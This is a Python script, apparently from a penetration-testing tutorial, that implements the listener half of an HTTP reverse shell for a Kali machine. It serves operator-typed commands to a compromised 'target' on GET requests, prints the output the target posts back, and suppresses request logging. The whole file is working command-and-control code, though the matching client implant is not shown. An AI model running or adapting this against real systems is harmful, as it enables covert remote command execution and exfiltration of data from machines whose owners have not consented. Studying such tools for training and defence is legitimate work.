
from http.server import BaseHTTPRequestHandler,HTTPServer

HOST_NAME = '127.0.0.1' # Kali IP address 
PORT_NUMBER = 60080 # Listening port number 


class MyHandler(BaseHTTPRequestHandler): # MyHandler defines what we should do when we receive a GET/POST request
                                                          # from the client / target

    def log_message(format,a,b,c,d):
        # log nothing
        pass
    def do_GET(s):
        #If we got a GET request, we will:- 
        print("pleae enter command")
        command = input() #take user input
        # command = "dir"
        print(command)
        s.send_response(200) #return HTML status 200 (OK)
        s.send_header("Content-type", "text/html") # Inform the target that content type header is "text/html"
        s.end_headers()
        s.wfile.write(command.encode()) #send the command which we got from the user input


    def do_POST(s):
                                                     #If we got a POST, we will:- 
        s.send_response(200) #return HTML status 200 (OK)
        s.end_headers()
        length = int(s.headers['Content-Length']) #Define the length which means how many bytes the HTTP POST data contains, the length
                                                     #value has to be integer 
        postVar = s.rfile.read(length) # Read then print the posted data
        print(postVar.decode('utf-8'))




if __name__ == '__main__':


    # We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)

    server = HTTPServer((HOST_NAME, PORT_NUMBER), MyHandler)



    try: 
        server.serve_forever() # start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server
    except KeyboardInterrupt: 
        # print '[!] Server is terminated'
        server.server_close()
